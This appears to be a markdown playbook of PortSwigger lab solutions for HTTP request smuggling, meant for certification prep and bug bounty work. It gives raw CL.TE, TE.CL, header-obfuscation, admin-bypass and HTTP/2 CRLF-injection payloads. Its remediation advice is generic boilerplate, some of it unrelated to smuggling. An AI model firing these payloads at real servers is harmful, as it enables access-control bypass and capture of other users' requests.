---
name: "HTTP Request Smuggling — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1190"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# HTTP Request Smuggling — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: CL.TE basic 🟡 PRACTITIONER
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0


G
```
Frontend uses Content-Length, backend uses Transfer-Encoding. The `G` poisons the next request as `GPOST`.
---

### Lab 2: TE.CL basic 🟡 PRACTITIONER
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

5c

GPOST / HTTP/1.1

Content-Type: x

Content-Length: 15


x=1

0


```
---

### Lab 3: TE header obfuscation 🟡 PRACTITIONER
```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```
Or: `Transfer-Encoding : chunked`, `Transfer-Encoding: xchunked`, `Transfer-Encoding: chunked\n`
---

### Lab 4: Confirm CL.TE via differential 🟡 PRACTITIONER
Send CL.TE probe twice. First: normal. Second: timeout or 404 = confirmed.
---

### Lab 5: Confirm TE.CL via differential 🟡 PRACTITIONER
Same approach — timeout on second request confirms desync.
---

### Lab 6: Bypass front-end controls CL.TE 🟡 PRACTITIONER
```http
POST / HTTP/1.1
Content-Length: 116
Transfer-Encoding: chunked

0


GET /admin HTTP/1.1

Host: TARGET

Content-Length: 10


x=
```
Smuggled `/admin` request bypasses frontend access control.
---

### Lab 7: Bypass front-end controls TE.CL 🟡 PRACTITIONER
Same concept: smuggle admin request via TE.CL desync.
---

### Lab 8: Reveal front-end rewriting 🟡 PRACTITIONER
Smuggle a request to a parameter that reflects input. The reflected content shows what headers the front-end adds.
---

### Lab 9: Capture other users requests 🟡 PRACTITIONER
Smuggle a POST to a comment/storage endpoint. Victim's request appended as comment body.
---

### Lab 10: Deliver reflected XSS 🟡 PRACTITIONER
Smuggle request with XSS payload in User-Agent to a reflecting endpoint.
---

### Lab 11: Response queue poisoning H2.TE 🟡 PRACTITIONER
HTTP/2 frontend, HTTP/1.1 backend. Smuggle complete request → response queue misalignment.
---

### Lab 12: H2.CL smuggling 🟡 PRACTITIONER
HTTP/2 allows `Content-Length` header. Backend (HTTP/1.1) processes CL → desync.
---

### Lab 13: HTTP/2 CRLF injection 🟡 PRACTITIONER
```http
Foo: bar\r\nTransfer-Encoding: chunked
```
HTTP/2 binary framing allows CRLF in header values → backend sees TE header.
---

### Lab 14: HTTP/2 request splitting CRLF 🟡 PRACTITIONER
Inject a complete second request via CRLF in HTTP/2 header value.
---

### Lab 15: 0.CL smuggling 🔴 EXPERT
Backend ignores `Content-Length: 0` and reads body → body becomes next request prefix.
---

### Lab 16: CL.0 smuggling 🔴 EXPERT
Backend returns `Connection: keep-alive` but ignores Content-Length → leftover body poisons next request.
---

### Lab 17: Web cache poisoning via smuggling 🔴 EXPERT
Smuggle request that poisons cache with XSS payload for static resource.
---

### Lab 18: Web cache deception via smuggling 🔴 EXPERT
Smuggle request to make victim's private page get cached under a public URL.
---

### Lab 19: H2 request tunnelling bypass AC 🔴 EXPERT
Tunnel smuggled request through HTTP/2 connection to bypass access controls.
---

### Lab 20: Cache poisoning via H2 tunnel 🔴 EXPERT
Combine H2 tunnelling with cache poisoning.
---

### Lab 21: Client-side desync 🔴 EXPERT
Browser-based desync: CL.0 on same connection causes browser to misinterpret response boundaries.
---

### Lab 22: Server-side pause-based 🔴 EXPERT
Pause mid-request to trigger timeout-based desync on servers that handle partial requests differently.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
